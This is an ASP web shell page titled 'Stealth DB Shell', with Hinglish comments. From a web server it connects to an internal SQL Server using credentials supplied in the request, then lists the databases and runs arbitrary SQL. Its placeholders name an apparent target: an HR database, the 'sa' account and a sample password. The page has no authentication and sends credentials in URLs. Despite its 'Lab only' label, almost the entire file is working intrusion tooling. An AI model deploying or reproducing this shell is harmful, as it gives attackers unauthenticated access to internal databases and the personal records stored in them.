<%@ Language=VBScript %>
<%
' Stealth DB Shell - TCP Force + Hostname Fix (Lab only!)

Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl

srv = Trim(Request("server") & Request.Form("server"))
dbn = Trim(Request("dbname") & Request.Form("dbname"))
usr = Trim(Request("user") & Request.Form("user"))
pwd = Trim(Request("pass") & Request.Form("pass"))
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ErrMsg = ""

If srv <> "" Then
    ' TCP force kar rahe hain (no named pipes fallback)
    ConnStr = "Provider=SQLNCLI11;Server=tcp:" & srv & ",1433;"
    If dbn <> "" Then ConnStr = ConnStr & "Database=" & dbn & ";"
    ConnStr = ConnStr & "Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Agar SQLNCLI11 nahi chal raha to fallback
    ' ConnStr = "Provider=SQLOLEDB;Data Source=tcp:" & srv & ",1433;"
    ' If dbn <> "" Then ConnStr = ConnStr & "Initial Catalog=" & dbn & ";"
    ' ConnStr = ConnStr & "User ID=" & usr & ";Password=" & pwd & ";"

    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        ErrMsg = "Connection Failed: " & Err.Description & " (Code: " & Err.Number & ")<br><br>" & _
                 "Fix: <br>" & _
                 "1. Server mein IP daal (ping ATT-N-ACC se IP le).<br>" & _
                 "2. Agar instance hai to IP\INSTANCE_NAME daal (e.g. 192.168.1.50\SQLEXPRESS).<br>" & _
                 "3. SQL Config mein TCP/IP enable + port 1433 set kar.<br>" & _
                 "4. SQL Browser service start kar."
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Shell - TCP + IP Fix</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>DB Shell (Connection Form)</h2>

<form method="post">
    Server/IP: <input name="server" value="<%=Server.HTMLEncode(srv)%>" size="40" placeholder="ATT-N-ACC ya IP (e.g. 192.168.1.50) ya IP\SQLEXPRESS"><br><br>
    DB Name: <input name="dbname" value="<%=Server.HTMLEncode(dbn)%>" size="40" placeholder="HRSuiteHC"><br><br>
    User ID: <input name="user" value="<%=Server.HTMLEncode(usr)%>" size="40" placeholder="sa"><br><br>
    Password: <input type="password" name="pass" value="<%=Server.HTMLEncode(pwd)%>" size="40" placeholder="HRPass123"><br><br>
    <input type="submit" value="Connect">
</form>

<% If ErrMsg <> "" Then %>
    <div style="color:red; background:#300; padding:15px; margin:15px 0; border:2px solid red; font-weight:bold;">
        <%=ErrMsg%>
    </div>
<% ElseIf Conn Is Nothing Then %>
    <p style="color:yellow;">Connect first. Pehle ping ATT-N-ACC kar ke IP daal.</p>
<% Else %>
    <div style="color:lime; background:#030; padding:15px; border:2px solid lime;">
        Connected! Server: <%=srv%> | DB: <%=dbn%>
    </div>

    <h3>Databases (click kar tables dekhne ke liye)</h3>
    <%
    Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
    Do While Not RS.EOF
        Response.Write "<a href='?act=tables&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(RS("name")) & "'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>

    <h3>Custom Query (tables test ke liye)</h3>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.URLEncode(srv)%>">
        <input type="hidden" name="user" value="<%=Server.URLEncode(usr)%>">
        <input type="hidden" name="pass" value="<%=Server.URLEncode(pwd)%>">
        <input type="hidden" name="dbname" value="<%=Server.URLEncode(dbn)%>">
        Query: <input name="query" size="80" value="SELECT name FROM sys.tables"><br>
        <input type="submit" value="Run">
    </form>

    <!-- Baaki tables/browsing code yahan paste kar sakta hai (act=tables, browse etc.) -->

<% End If %>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
